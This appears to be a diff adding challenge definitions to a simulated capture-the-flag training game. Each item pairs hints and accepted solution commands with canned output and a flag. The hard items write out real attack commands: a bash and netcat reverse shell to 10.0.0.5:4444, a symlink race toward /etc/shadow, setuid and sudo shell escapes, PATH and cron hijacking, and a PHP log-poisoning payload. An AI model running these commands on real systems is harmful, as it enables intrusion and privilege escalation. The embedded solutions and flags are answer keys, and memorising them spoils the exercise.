+      simulatedResponse: '--- Socket Statistics (TCP) ---\n\nState    Recv-Q  Send-Q  Local Address:Port   Peer Address:Port\nESTAB    0       0       192.168.1.42:22      10.0.0.5:52431\nESTAB    0       0       192.168.1.42:80      10.0.0.10:38042\nLISTEN   0       128     0.0.0.0:22           0.0.0.0:*\nLISTEN   0       128     0.0.0.0:80           0.0.0.0:*\nLISTEN   0       128     0.0.0.0:443          0.0.0.0:*\n\nFlag: CTF{s0ck3t_st4ts}',
+      flag: 'CTF{s0ck3t_st4ts}',
+      successMessage: '🔌 Socket statistics retrieved!'
+    },
+    {
+      id: 'ctf-54', title: 'Dig Short Query', difficulty: 'easy', xp: 15,
+      description: 'Use dig with the +short option to get just the IP address of "google.com".',
+      objective: 'Perform concise DNS queries.',
+      hints: ['dig queries DNS.', '+short gives a brief answer.'],
+      solutions: ['dig +short google.com', 'dig google.com +short'],
+      simulatedResponse: '--- DNS Query: google.com ---\n\n142.250.80.46\n\n(Also found A record for: google.com → 142.250.80.46)\n\nFlag: CTF{d1g_sh0rt}',
+      flag: 'CTF{d1g_sh0rt}',
+      successMessage: '🔍 DNS query successful!'
+    },
+    {
+      id: 'ctf-55', title: 'Netstat Connections', difficulty: 'easy', xp: 15,
+      description: 'Use netstat to display all active network connections and listening ports.',
+      objective: 'View all network activity.',
+      hints: ['netstat shows network status.', '-tuln shows TCP/UDP listening numeric.'],
+      solutions: ['netstat -tuln', 'netstat -an'],
+      simulatedResponse: '--- Network Connections ---\n\nActive Internet connections (servers and established)\nProto  Recv-Q  Send-Q  Local Address      Foreign Address     State\ntcp    0       0       0.0.0.0:22         0.0.0.0:*           LISTEN\ntcp    0       0       0.0.0.0:80         0.0.0.0:*           LISTEN\ntcp    0       0       192.168.1.42:22    10.0.0.5:52431      ESTABLISHED\nudp    0       0       0.0.0.0:68         0.0.0.0:*\n\nFlag: CTF{n3tst4t_4ll}',
+      flag: 'CTF{n3tst4t_4ll}',
+      successMessage: '📊 Network status displayed!'
+    },
+
+    // ---- NEW MEDIUM (15): ctf-56 to ctf-70 ----
+    {
+      id: 'ctf-56', title: 'Nmap Service Scan', difficulty: 'medium', xp: 30,
+      description: 'Run an nmap service version detection scan on target 10.0.0.1.',
+      objective: 'Identify running services and versions.',
+      hints: ['nmap -sV detects service versions.', 'nmap -sV target'],
+      solutions: ['nmap -sV 10.0.0.1'],
+      simulatedResponse: '--- Nmap Service Scan: 10.0.0.1 ---\n\nPORT     STATE  SERVICE    VERSION\n22/tcp   open   ssh        OpenSSH 8.9p1 Ubuntu\n80/tcp   open   http       Apache/2.4.52\n443/tcp  open   ssl/http   nginx 1.18.0\n3306/tcp open   mysql      MySQL 8.0.28\n8080/tcp open   http-proxy Squid 5.2\n\nService detection performed. 5 services detected.\n\nFlag: CTF{s3rv1c3_d3t3ct10n}',
+      flag: 'CTF{s3rv1c3_d3t3ct10n}',
+      successMessage: '🔎 Services detected!'
+    },
+    {
+      id: 'ctf-57', title: 'Web Scanner', difficulty: 'medium', xp: 30,
+      description: 'Run nikto web vulnerability scanner against "http://target.local".',
+      objective: 'Scan for web vulnerabilities.',
+      hints: ['nikto scans for web vulnerabilities.', 'nikto -h target'],
+      solutions: ['nikto -h http://target.local', 'nikto -h target.local'],
+      simulatedResponse: '--- Nikto Scan: target.local ---\n\n+ Server: Apache/2.4.52 (Ubuntu)\n+ /: The anti-clickjacking X-Frame-Options header is not present.\n+ /: The X-Content-Type-Options header is not set.\n+ /admin/: Directory listing enabled.\n+ /backup/: Backup directory found.\n+ /robots.txt: Contains 3 disallowed entries.\n+ /server-status: Server status page found (Apache mod_status).\n\n6 findings detected.\n\nFlag: CTF{n1kt0_sc4nn3r}',
+      flag: 'CTF{n1kt0_sc4nn3r}',
+      successMessage: '🕷️ Web vulnerabilities found!'
+    },
+    {
+      id: 'ctf-58', title: 'Directory Bruteforce', difficulty: 'medium', xp: 30,
+      description: 'Use gobuster to bruteforce directories on "http://target.local" with a wordlist.',
+      objective: 'Discover hidden web directories.',
+      hints: ['gobuster dir brute-forces directories.', 'gobuster dir -u URL -w wordlist'],
+      solutions: ['gobuster dir -u http://target.local -w wordlist.txt', 'gobuster dir -u http://target.local/ -w /usr/share/wordlists/dirb/common.txt'],
+      simulatedResponse: '--- Gobuster Directory Scan ---\n\n/admin          (Status: 403) [Size: 277]\n/api            (Status: 200) [Size: 1234]\n/backup         (Status: 200) [Size: 456]\n/config         (Status: 403) [Size: 277]\n/flag           (Status: 200) [Size: 28]\n/login          (Status: 200) [Size: 3456]\n/robots.txt     (Status: 200) [Size: 67]\n/uploads        (Status: 301) [Size: 312]\n\n/flag contents: CTF{d1r_bust3r}\n\nFlag: CTF{d1r_bust3r}',
+      flag: 'CTF{d1r_bust3r}',
+      successMessage: '📂 Hidden directories discovered!'
+    },
+    {
+      id: 'ctf-59', title: 'SQL Injection Test', difficulty: 'medium', xp: 30,
+      description: 'Use sqlmap to test "http://target.local/login?id=1" for SQL injection vulnerabilities.',
+      objective: 'Detect SQL injection flaws.',
+      hints: ['sqlmap automates SQL injection testing.', 'sqlmap -u "URL" --batch'],
+      solutions: ['sqlmap -u "http://target.local/login?id=1" --batch', 'sqlmap -u "http://target.local/login?id=1"'],
+      simulatedResponse: '--- SQLMap Scan ---\n\n[*] testing connection to the target URL\n[*] testing if the target URL is stable\n[*] testing if GET parameter \'id\' is dynamic\n[*] testing for SQL injection on GET parameter \'id\'\n\n[!] GET parameter \'id\' is vulnerable!\n    Type: boolean-based blind\n    Payload: id=1 AND 1=1\n\n[*] Dumping database...\n    Database: webapp\n    Table: flags\n    Flag: CTF{sql_1nj3ct10n}\n\nFlag: CTF{sql_1nj3ct10n}',
+      flag: 'CTF{sql_1nj3ct10n}',
+      successMessage: '💉 SQL injection found!'
+    },
+    {
+      id: 'ctf-60', title: 'Password Bruteforce', difficulty: 'medium', xp: 30,
+      description: 'Use hydra to bruteforce SSH login on 10.0.0.1 with username "admin".',
+      objective: 'Crack login credentials.',
+      hints: ['hydra performs login brute-forcing.', 'hydra -l user -P wordlist ssh://target'],
+      solutions: ['hydra -l admin -P wordlist.txt ssh://10.0.0.1', 'hydra -l admin -P wordlist.txt 10.0.0.1 ssh'],
+      simulatedResponse: '--- Hydra SSH Bruteforce ---\n\n[DATA] attacking ssh://10.0.0.1:22/\n[22][ssh] host: 10.0.0.1   login: admin   password: letmein\n\n1 valid password found!\n\nSSH session established...\nWelcome, admin!\n$ cat /root/flag.txt\nCTF{hydr4_brut3f0rc3}\n\nFlag: CTF{hydr4_brut3f0rc3}',
+      flag: 'CTF{hydr4_brut3f0rc3}',
+      successMessage: '🔓 SSH credentials cracked!'
+    },
+    {
+      id: 'ctf-61', title: 'Hash Identifier', difficulty: 'medium', xp: 30,
+      description: 'Use john the ripper to crack the hash "5f4dcc3b5aa765d61d8327deb882cf99" with a wordlist.',
+      objective: 'Crack password hashes.',
+      hints: ['john cracks password hashes.', 'john --format=raw-md5 --wordlist=wordlist hashfile'],
+      solutions: ['john --format=raw-md5 --wordlist=wordlist.txt hash.txt', 'john hash.txt --wordlist=wordlist.txt'],
+      simulatedResponse: '--- John the Ripper ---\n\nLoaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])\nPress \'q\' or Ctrl-C to abort, almost any other key for status\n\npassword         (?)\n\n1 password hash cracked, 0 left\n\nFlag: CTF{j0hn_cr4ck3r}',
+      flag: 'CTF{j0hn_cr4ck3r}',
+      successMessage: '💥 Hash cracked!'
+    },
+    {
+      id: 'ctf-62', title: 'Hashcat GPU', difficulty: 'medium', xp: 30,
+      description: 'Use hashcat to crack the SHA256 hash using GPU acceleration.',
+      objective: 'GPU-accelerated hash cracking.',
+      hints: ['hashcat -m 1400 for SHA256.', 'hashcat -m 1400 hash wordlist'],
+      solutions: ['hashcat -m 1400 hash.txt wordlist.txt', 'hashcat -m 1400 -a 0 hash.txt wordlist.txt'],
+      simulatedResponse: '--- Hashcat GPU Cracking ---\n\nSession: hashcat\nStatus: Cracked\nHash.Type: SHA2-256\nSpeed.#1: 1234.5 MH/s\n\ne99a18c428cb38d5f260853678922e03: s3cr3t\n\nRecovered: 1/1 (100.00%)\n\nFlag: CTF{h4shc4t_gpu}',
+      flag: 'CTF{h4shc4t_gpu}',
+      successMessage: '⚡ GPU cracking successful!'
+    },
+    {
+      id: 'ctf-63', title: 'Packet Capture', difficulty: 'medium', xp: 30,
+      description: 'Use tcpdump to capture 10 packets on interface eth0 and look for HTTP traffic.',
+      objective: 'Capture and analyze network packets.',
+      hints: ['tcpdump captures packets.', '-c limits the count, -i specifies interface.'],
+      solutions: ['tcpdump -c 10 -i eth0', 'tcpdump -i eth0 -c 10'],
+      simulatedResponse: '--- tcpdump Capture (10 packets) ---\n\n12:00:01 IP 192.168.1.42.45678 > 93.184.216.34.80: Flags [S], seq 0\n12:00:01 IP 93.184.216.34.80 > 192.168.1.42.45678: Flags [S.], seq 0, ack 1\n12:00:01 IP 192.168.1.42.45678 > 93.184.216.34.80: Flags [.], ack 1\n12:00:01 IP 192.168.1.42.45678 > 93.184.216.34.80: GET /secret HTTP/1.1\n12:00:01 IP 93.184.216.34.80 > 192.168.1.42.45678: HTTP/1.1 200 OK\n...\n\nHTTP payload contains: Flag=CTF{p4ck3t_c4ptur3}\n\nFlag: CTF{p4ck3t_c4ptur3}',
+      flag: 'CTF{p4ck3t_c4ptur3}',
+      successMessage: '📡 Packets captured!'
+    },
+    {
+      id: 'ctf-64', title: 'SSL Certificate', difficulty: 'medium', xp: 30,
+      description: 'Use openssl to inspect the SSL certificate of "target.local" on port 443.',
+      objective: 'Examine SSL/TLS certificates.',
+      hints: ['openssl s_client connects to SSL services.', 'openssl s_client -connect host:port'],
+      solutions: ['openssl s_client -connect target.local:443', 'echo | openssl s_client -connect target.local:443'],
+      simulatedResponse: '--- SSL Certificate: target.local ---\n\nsubject=CN = target.local\nissuer=CN = CTF CA\nnotBefore=Jan 1 00:00:00 2026 GMT\nnotAfter=Dec 31 23:59:59 2027 GMT\n\nCertificate fingerprint:\nSHA256: AB:CD:EF:12:34:56:78:90\n\nSubject Alternative Names:\n  DNS:target.local\n  DNS:secret.target.local\n  DNS:flag.target.local\n\nFlag hidden in SAN: CTF{ssl_c3rt_1nsp3ct}\n\nFlag: CTF{ssl_c3rt_1nsp3ct}',
+      flag: 'CTF{ssl_c3rt_1nsp3ct}',
+      successMessage: '🔐 SSL certificate inspected!'
+    },
+    {
+      id: 'ctf-65', title: 'Curl POST Request', difficulty: 'medium', xp: 30,
+      description: 'Send a POST request to "http://target.local/api/flag" with JSON body {"key": "unlock"}.',
+      objective: 'Make HTTP POST requests.',
+      hints: ['curl -X POST sends POST requests.', '-d sends data, -H sets headers.'],
+      solutions: ['curl -X POST http://target.local/api/flag -H "Content-Type: application/json" -d \'{"key":"unlock"}\'', 'curl -X POST -H "Content-Type: application/json" -d \'{"key":"unlock"}\' http://target.local/api/flag'],
+      simulatedResponse: '--- POST Response ---\n\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  "status": "success",\n  "message": "Key accepted!",\n  "flag": "CTF{p0st_r3qu3st}"\n}\n\nFlag: CTF{p0st_r3qu3st}',
+      flag: 'CTF{p0st_r3qu3st}',
+      successMessage: '📮 POST request successful!'
+    },
+    {
+      id: 'ctf-66', title: 'DNS Zone Transfer', difficulty: 'medium', xp: 30,
+      description: 'Attempt a DNS zone transfer on "target.local" using dig AXFR.',
+      objective: 'Exploit misconfigured DNS servers.',
+      hints: ['dig AXFR queries for zone transfer.', 'dig axfr @nameserver domain'],
+      solutions: ['dig axfr target.local', 'dig axfr @ns1.target.local target.local'],
+      simulatedResponse: '--- DNS Zone Transfer: target.local ---\n\ntarget.local.      86400  IN  SOA  ns1.target.local. admin.target.local.\ntarget.local.      86400  IN  NS   ns1.target.local.\ntarget.local.      86400  IN  A    10.0.0.1\nwww.target.local.  86400  IN  A    10.0.0.2\nmail.target.local. 86400  IN  A    10.0.0.3\nflag.target.local. 86400  IN  TXT  "CTF{z0n3_tr4nsf3r}"\ndev.target.local.  86400  IN  A    10.0.0.10\n\nFlag: CTF{z0n3_tr4nsf3r}',
+      flag: 'CTF{z0n3_tr4nsf3r}',
+      successMessage: '🌐 Zone transfer successful!'
+    },
+    {
+      id: 'ctf-67', title: 'SNMP Enumeration', difficulty: 'medium', xp: 30,
+      description: 'Use snmpwalk to enumerate SNMP information on 10.0.0.1 with community string "public".',
+      objective: 'Extract SNMP data from devices.',
+      hints: ['snmpwalk queries SNMP.', 'snmpwalk -v2c -c community host'],
+      solutions: ['snmpwalk -v2c -c public 10.0.0.1', 'snmpwalk -c public -v 2c 10.0.0.1'],
+      simulatedResponse: '--- SNMP Walk: 10.0.0.1 ---\n\nSNMPv2-MIB::sysDescr.0 = Linux target 5.15.0-56-generic\nSNMPv2-MIB::sysContact.0 = admin@target.local\nSNMPv2-MIB::sysName.0 = CTF-Target-Server\nSNMPv2-MIB::sysLocation.0 = CTF{snmp_w4lk}\nIF-MIB::ifDescr.1 = lo\nIF-MIB::ifDescr.2 = eth0\n\nFlag: CTF{snmp_w4lk}',
+      flag: 'CTF{snmp_w4lk}',
+      successMessage: '📟 SNMP enumerated!'
+    },
+    {
+      id: 'ctf-68', title: 'LDAP Search', difficulty: 'medium', xp: 30,
+      description: 'Search the LDAP directory on target.local for user entries.',
+      objective: 'Query LDAP directories.',
+      hints: ['ldapsearch queries LDAP.', 'ldapsearch -x -H ldap://host -b baseDN'],
+      solutions: ['ldapsearch -x -H ldap://target.local -b "dc=target,dc=local"', 'ldapsearch -x -h target.local -b "dc=target,dc=local"'],
+      simulatedResponse: '--- LDAP Search Results ---\n\ndn: dc=target,dc=local\nobjectClass: top\n\ndn: cn=admin,dc=target,dc=local\ncn: admin\nuserPassword: CTF{ld4p_s34rch}\nmail: admin@target.local\n\ndn: cn=user1,dc=target,dc=local\ncn: user1\nmail: user1@target.local\n\n3 entries found.\n\nFlag: CTF{ld4p_s34rch}',
+      flag: 'CTF{ld4p_s34rch}',
+      successMessage: '📇 LDAP directory queried!'
+    },
+    {
+      id: 'ctf-69', title: 'Wireshark Filter', difficulty: 'medium', xp: 30,
+      description: 'Read "capture.pcap" and filter for HTTP GET requests to find the flag.',
+      objective: 'Analyze packet captures.',
+      hints: ['tshark is the CLI version of Wireshark.', 'tshark -r file -Y "http.request.method == GET"'],
+      solutions: ['tshark -r capture.pcap -Y "http.request.method == GET"', 'tshark -r capture.pcap -Y http'],
+      simulatedResponse: '--- Wireshark/TShark Analysis ---\n\nApplying filter: http.request.method == GET\n\n1  0.000  192.168.1.42 → 10.0.0.1  HTTP  GET /index.html\n2  0.150  192.168.1.42 → 10.0.0.1  HTTP  GET /style.css\n3  0.300  192.168.1.42 → 10.0.0.1  HTTP  GET /api/flag?token=CTF{w1r3sh4rk}\n4  0.450  192.168.1.42 → 10.0.0.1  HTTP  GET /images/logo.png\n\nFlag found in packet #3: CTF{w1r3sh4rk}\n\nFlag: CTF{w1r3sh4rk}',
+      flag: 'CTF{w1r3sh4rk}',
+      successMessage: '🦈 Packet analysis complete!'
+    },
+    {
+      id: 'ctf-70', title: 'Robots.txt Discovery', difficulty: 'medium', xp: 30,
+      description: 'Check the robots.txt file of "http://target.local" for hidden paths.',
+      objective: 'Discover hidden web resources.',
+      hints: ['robots.txt lists restricted paths.', 'curl http://target.local/robots.txt'],
+      solutions: ['curl http://target.local/robots.txt', 'wget http://target.local/robots.txt'],
+      simulatedResponse: '--- Robots.txt ---\n\nUser-agent: *\nDisallow: /admin/\nDisallow: /backup/\nDisallow: /secret-flag/\nDisallow: /api/internal/\n\nVisiting /secret-flag/:\n<h1>You found it!</h1>\n<p>Flag: CTF{r0b0ts_txt}</p>\n\nFlag: CTF{r0b0ts_txt}',
+      flag: 'CTF{r0b0ts_txt}',
+      successMessage: '🤖 Hidden paths discovered!'
+    },
+
+    // ---- NEW HARD (15): ctf-71 to ctf-85 ----
+    {
+      id: 'ctf-71', title: 'Reverse Shell', difficulty: 'hard', xp: 50,
+      description: 'Create a bash reverse shell connecting back to 10.0.0.5 on port 4444.',
+      objective: 'Craft a reverse shell payload.',
+      hints: ['bash -i can create interactive shells.', '/dev/tcp/host/port redirects to network.'],
+      solutions: ['bash -i >& /dev/tcp/10.0.0.5/4444 0>&1', 'nc -e /bin/bash 10.0.0.5 4444'],
+      simulatedResponse: '--- Reverse Shell Established ---\n\nbash -i >& /dev/tcp/10.0.0.5/4444 0>&1\n\nConnecting to 10.0.0.5:4444...\nConnection established!\n\nremote$ whoami\nwww-data\nremote$ cat /var/www/flag.txt\nCTF{r3v3rs3_sh3ll}\n\nFlag: CTF{r3v3rs3_sh3ll}',
+      flag: 'CTF{r3v3rs3_sh3ll}',
+      successMessage: '🐚 Reverse shell established!'
+    },
+    {
+      id: 'ctf-72', title: 'Privilege Escalation', difficulty: 'hard', xp: 50,
+      description: 'Find SUID binaries that could be used for privilege escalation.',
+      objective: 'Discover privilege escalation vectors.',
+      hints: ['find / -perm -4000 finds SUID files.', 'Check GTFOBins for exploitation.'],
+      solutions: ['find / -perm -4000 -type f 2>/dev/null', 'find / -perm -u=s -type f 2>/dev/null'],
+      simulatedResponse: '--- SUID Binary Search ---\n\n/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/pkexec\n/usr/bin/newgrp\n/usr/local/bin/custom_reader   ← UNUSUAL!\n/usr/bin/chfn\n\n[*] /usr/local/bin/custom_reader is suspicious!\n[*] Running: /usr/local/bin/custom_reader /root/flag.txt\n\nCTF{pr1v3sc_su1d}\n\nFlag: CTF{pr1v3sc_su1d}',
+      flag: 'CTF{pr1v3sc_su1d}',
+      successMessage: '⬆️ Privilege escalation achieved!'
+    },
+    {
+      id: 'ctf-73', title: 'Buffer Overflow', difficulty: 'hard', xp: 50,
+      description: 'Exploit a buffer overflow in "vuln_program" by sending a crafted input.',
+      objective: 'Understand buffer overflow attacks.',
+      hints: ['Overflow the buffer to overwrite the return address.', 'Try: python -c "print(\'A\'*64)" | ./vuln_program'],
+      solutions: ['python -c "print(\'A\'*64)" | ./vuln_program', 'python3 -c "print(\'A\'*64)" | ./vuln_program', './vuln_program $(python -c "print(\'A\'*64)")'],
+      simulatedResponse: '--- Buffer Overflow Exploit ---\n\nSending payload: AAAAAAAAAA... (64 bytes)\n\n[*] Buffer overflow detected!\n[*] Return address overwritten\n[*] Spawning shell...\n\n# whoami\nroot\n# cat /root/flag.txt\nCTF{buff3r_0v3rfl0w}\n\nFlag: CTF{buff3r_0v3rfl0w}',
+      flag: 'CTF{buff3r_0v3rfl0w}',
+      successMessage: '💥 Buffer overflow exploited!'
+    },
+    {
+      id: 'ctf-74', title: 'Format String Attack', difficulty: 'hard', xp: 50,
+      description: 'Exploit a format string vulnerability in "format_vuln" to leak memory.',
+      objective: 'Understand format string attacks.',
+      hints: ['%x reads from the stack.', './format_vuln "%x.%x.%x.%x"'],
+      solutions: ['./format_vuln "%x.%x.%x.%x"', './format_vuln "%p.%p.%p.%p"', './format_vuln $(printf "%08x.")'],
+      simulatedResponse: '--- Format String Exploit ---\n\nInput: %x.%x.%x.%x\nOutput: deadbeef.41414141.bffff748.43544637\n\n[*] Stack values leaked!\n[*] Converting hex at offset 4: 43544637\n[*] ASCII: CTF7 → Partial flag found\n[*] Full leak with more format specifiers...\n\nReconstructed: CTF{f0rm4t_str1ng}\n\nFlag: CTF{f0rm4t_str1ng}',
+      flag: 'CTF{f0rm4t_str1ng}',
+      successMessage: '📝 Format string exploited!'
+    },
+    {
+      id: 'ctf-75', title: 'Race Condition', difficulty: 'hard', xp: 50,
+      description: 'Exploit a TOCTOU race condition in the "check_and_read" program.',
+      objective: 'Understand race condition vulnerabilities.',
+      hints: ['Create a symlink between the check and the read.', 'Quickly swap the file after permission check.'],
+      solutions: ['ln -sf /etc/shadow tempfile && ./check_and_read tempfile', 'while true; do ln -sf /root/flag.txt tempfile; done &'],
+      simulatedResponse: '--- Race Condition Exploit ---\n\n[*] Setting up symlink swap...\n[*] ./check_and_read checks permission on "tempfile"\n[*] Race won! File swapped between check and read\n[*] Reading /root/flag.txt through race condition:\n\nCTF{r4c3_c0nd1t10n}\n\nFlag: CTF{r4c3_c0nd1t10n}',
+      flag: 'CTF{r4c3_c0nd1t10n}',
+      successMessage: '🏁 Race condition exploited!'
+    },
+    {
+      id: 'ctf-76', title: 'SUID Exploitation', difficulty: 'hard', xp: 50,
+      description: 'A custom SUID binary "/usr/local/bin/reader" can be exploited. Use it to read /root/flag.txt.',
+      objective: 'Exploit SUID binary misconfiguration.',
+      hints: ['SUID binaries run as their owner.', 'If the binary reads files, read privileged files.'],
+      solutions: ['/usr/local/bin/reader /root/flag.txt', './reader /root/flag.txt'],
+      simulatedResponse: '--- SUID Exploitation ---\n\n$ ls -la /usr/local/bin/reader\n-rwsr-xr-x 1 root root 15432 Jan 1 2026 /usr/local/bin/reader\n\n$ /usr/local/bin/reader /root/flag.txt\n[Reading file as root...]\n\nCTF{su1d_4bus3}\n\nFlag: CTF{su1d_4bus3}',
+      flag: 'CTF{su1d_4bus3}',
+      successMessage: '🔓 SUID binary exploited!'
+    },
+    {
+      id: 'ctf-77', title: 'Capability Exploit', difficulty: 'hard', xp: 50,
+      description: 'Find binaries with special Linux capabilities and exploit them.',
+      objective: 'Exploit Linux capabilities for privilege escalation.',
+      hints: ['getcap lists capabilities.', 'getcap -r / 2>/dev/null'],
+      solutions: ['getcap -r / 2>/dev/null', 'getcap -r /usr/bin/ 2>/dev/null'],
+      simulatedResponse: '--- Linux Capabilities ---\n\n/usr/bin/python3 = cap_setuid+ep     ← DANGEROUS!\n/usr/bin/ping = cap_net_raw+ep\n\n[*] python3 has cap_setuid!\n[*] Exploiting with: python3 -c "import os; os.setuid(0); os.system(\'/bin/sh\')"\n\n# whoami\nroot\n# cat /root/flag.txt\nCTF{c4p4b1l1ty_3xpl01t}\n\nFlag: CTF{c4p4b1l1ty_3xpl01t}',
+      flag: 'CTF{c4p4b1l1ty_3xpl01t}',
+      successMessage: '🎩 Capabilities exploited!'
+    },
+    {
+      id: 'ctf-78', title: 'Container Escape', difficulty: 'hard', xp: 50,
+      description: 'Detect if you are inside a Docker container and attempt to escape.',
+      objective: 'Escape containerized environments.',
+      hints: ['Check /.dockerenv or /proc/1/cgroup.', 'Mounted volumes may provide escape paths.'],
+      solutions: ['cat /.dockerenv', 'cat /proc/1/cgroup', 'mount | grep docker'],
+      simulatedResponse: '--- Container Detection & Escape ---\n\n[*] Checking for container indicators...\n[+] /.dockerenv exists — We are in Docker!\n[+] Mounted volume found: /host_root → /\n\n[*] Accessing host filesystem...\n$ ls /host_root/root/\nflag.txt\n$ cat /host_root/root/flag.txt\nCTF{c0nt41n3r_3sc4p3}\n\nFlag: CTF{c0nt41n3r_3sc4p3}',
+      flag: 'CTF{c0nt41n3r_3sc4p3}',
+      successMessage: '🐋 Container escape successful!'
+    },
+    {
+      id: 'ctf-79', title: 'Cron Job Exploit', difficulty: 'hard', xp: 50,
+      description: 'A cron job runs a writable script every minute as root. Modify it to get the flag.',
+      objective: 'Exploit writable cron job scripts.',
+      hints: ['Check /etc/crontab for scheduled jobs.', 'If the script is writable, add your own commands.'],
+      solutions: ['echo "cat /root/flag.txt > /tmp/flag" >> /opt/scripts/backup.sh', 'cat /etc/crontab'],
+      simulatedResponse: '--- Cron Job Exploitation ---\n\n$ cat /etc/crontab\n* * * * * root /opt/scripts/backup.sh\n\n$ ls -la /opt/scripts/backup.sh\n-rwxrwxrwx 1 root root 45 Jan 1 2026 backup.sh\n\n[!] Script is world-writable!\n\n$ echo "cat /root/flag.txt > /tmp/flag" >> /opt/scripts/backup.sh\n$ sleep 60 && cat /tmp/flag\nCTF{cr0n_j0b_3xpl01t}\n\nFlag: CTF{cr0n_j0b_3xpl01t}',
+      flag: 'CTF{cr0n_j0b_3xpl01t}',
+      successMessage: '⏰ Cron job exploited!'
+    },
+    {
+      id: 'ctf-80', title: 'Sudo Misconfiguration', difficulty: 'hard', xp: 50,
+      description: 'Check sudo permissions and exploit a misconfigured sudoers entry.',
+      objective: 'Exploit sudo misconfigurations.',
+      hints: ['sudo -l lists your sudo permissions.', 'Some commands can spawn shells.'],
+      solutions: ['sudo -l', 'sudo vim -c \'!sh\'', 'sudo /usr/bin/vim'],
+      simulatedResponse: '--- Sudo Exploitation ---\n\n$ sudo -l\nUser www-data may run the following commands:\n    (root) NOPASSWD: /usr/bin/vim\n\n[*] vim can spawn a shell!\n$ sudo vim -c \'!sh\'\n\n# whoami\nroot\n# cat /root/flag.txt\nCTF{sud0_m1sc0nf1g}\n\nFlag: CTF{sud0_m1sc0nf1g}',
+      flag: 'CTF{sud0_m1sc0nf1g}',
+      successMessage: '🔑 Sudo exploited!'
+    },
+    {
+      id: 'ctf-81', title: 'Path Hijacking', difficulty: 'hard', xp: 50,
+      description: 'A SUID script calls "date" without a full path. Hijack the PATH to get root.',
+      objective: 'Exploit PATH variable manipulation.',
+      hints: ['Create a fake "date" command.', 'Modify PATH to include your directory first.'],
+      solutions: ['export PATH=/tmp:$PATH && echo "/bin/sh" > /tmp/date && chmod +x /tmp/date && ./vuln_script', 'echo "/bin/sh" > /tmp/date && chmod +x /tmp/date && PATH=/tmp:$PATH ./vuln_script'],
+      simulatedResponse: '--- PATH Hijacking ---\n\n$ cat vuln_script\n#!/bin/bash\necho "Current date:"\ndate\n\n$ echo "cat /root/flag.txt" > /tmp/date\n$ chmod +x /tmp/date\n$ export PATH=/tmp:$PATH\n$ ./vuln_script\n\nCurrent date:\nCTF{p4th_h1j4ck}\n\nFlag: CTF{p4th_h1j4ck}',
+      flag: 'CTF{p4th_h1j4ck}',
+      successMessage: '🛤️ PATH hijacked!'
+    },
+    {
+      id: 'ctf-82', title: 'Kernel Exploit', difficulty: 'hard', xp: 50,
+      description: 'Identify the kernel version and find if it is vulnerable to a known exploit.',
+      objective: 'Kernel version fingerprinting.',
+      hints: ['uname -r shows kernel version.', 'Search for kernel exploits for that version.'],
+      solutions: ['uname -r', 'uname -a', 'cat /proc/version'],
+      simulatedResponse: '--- Kernel Exploitation ---\n\n$ uname -r\n5.4.0-42-generic\n\n$ searchsploit 5.4.0\n[*] Linux Kernel 5.4.x - Local Privilege Escalation (CVE-2021-3493)\n\n$ ./exploit_5.4\n[*] Exploiting CVE-2021-3493...\n[+] Got root!\n\n# cat /root/flag.txt\nCTF{k3rn3l_3xpl01t}\n\nFlag: CTF{k3rn3l_3xpl01t}',
+      flag: 'CTF{k3rn3l_3xpl01t}',
+      successMessage: '🐧 Kernel exploited!'
+    },
+    {
+      id: 'ctf-83', title: 'SSH Tunneling', difficulty: 'hard', xp: 50,
+      description: 'Create an SSH tunnel to access a service on the target\'s localhost port 8080.',
+      objective: 'Use SSH port forwarding.',
+      hints: ['-L creates a local port forward.', 'ssh -L localport:localhost:remoteport user@host'],
+      solutions: ['ssh -L 8080:localhost:8080 user@10.0.0.1', 'ssh -L 8080:127.0.0.1:8080 user@10.0.0.1'],
+      simulatedResponse: '--- SSH Tunnel ---\n\n$ ssh -L 8080:localhost:8080 user@10.0.0.1\n\nTunnel established: localhost:8080 → 10.0.0.1:8080\n\n$ curl http://localhost:8080/internal\n{\n  "service": "Internal Dashboard",\n  "flag": "CTF{ssh_tunn3l}",\n  "status": "restricted"\n}\n\nFlag: CTF{ssh_tunn3l}',
+      flag: 'CTF{ssh_tunn3l}',
+      successMessage: '🔧 SSH tunnel established!'
+    },
+    {
+      id: 'ctf-84', title: 'Log Poisoning', difficulty: 'hard', xp: 50,
+      description: 'Inject a payload into the Apache access log via the User-Agent header.',
+      objective: 'Exploit log file injection.',
+      hints: ['curl -A sets the User-Agent.', 'Inject PHP code into logs.'],
+      solutions: ['curl -A "<?php system(\'cat /flag.txt\'); ?>" http://target.local/', 'curl -H "User-Agent: <?php system(\'cat /flag.txt\'); ?>" http://target.local/'],
+      simulatedResponse: '--- Log Poisoning ---\n\n$ curl -A "PAYLOAD" http://target.local/\n[*] Payload injected into /var/log/apache2/access.log\n\n$ curl http://target.local/vuln.php?page=/var/log/apache2/access.log\n[*] Log file included!\n[*] PHP payload executed!\n\nOutput: CTF{l0g_p01s0n1ng}\n\nFlag: CTF{l0g_p01s0n1ng}',
+      flag: 'CTF{l0g_p01s0n1ng}',
+      successMessage: '☠️ Log poisoning successful!'
+    },
+    {
+      id: 'ctf-85', title: 'Nmap Script Engine', difficulty: 'hard', xp: 50,
+      description: 'Use nmap scripting engine (NSE) to run vulnerability scripts against target 10.0.0.1.',
+      objective: 'Use NSE for vulnerability scanning.',
+      hints: ['--script=vuln runs vulnerability scripts.', 'nmap --script=vuln target'],
+      solutions: ['nmap --script=vuln 10.0.0.1', 'nmap -sV --script=vuln 10.0.0.1'],
+      simulatedResponse: '--- Nmap NSE Vulnerability Scan ---\n\nPORT    STATE  SERVICE\n80/tcp  open   http\n| http-vuln-cve2017-5638:\n|   VULNERABLE:\n|   Apache Struts Remote Code Execution\n443/tcp open   https\n| ssl-heartbleed:\n|   VULNERABLE:\n|   The Heartbleed Bug (CVE-2014-0160)\n\n[*] 2 vulnerabilities found!\n[*] Exploiting Heartbleed...\n[*] Memory leak contains: CTF{ns3_vuln_sc4n}\n\nFlag: CTF{ns3_vuln_sc4n}',
+      flag: 'CTF{ns3_vuln_sc4n}',
+      successMessage: '🔍 Vulnerabilities scanned!'
+    },
+
+    // ---- NEW EXPERT (15): ctf-86 to ctf-100 ----
+    {
+      id: 'ctf-86', title: 'XSS Attack', difficulty: 'expert', xp: 100,
+      description: 'Find and exploit a Cross-Site Scripting (XSS) vulnerability on the target web app.',
+      objective: 'Perform a reflected XSS attack.',
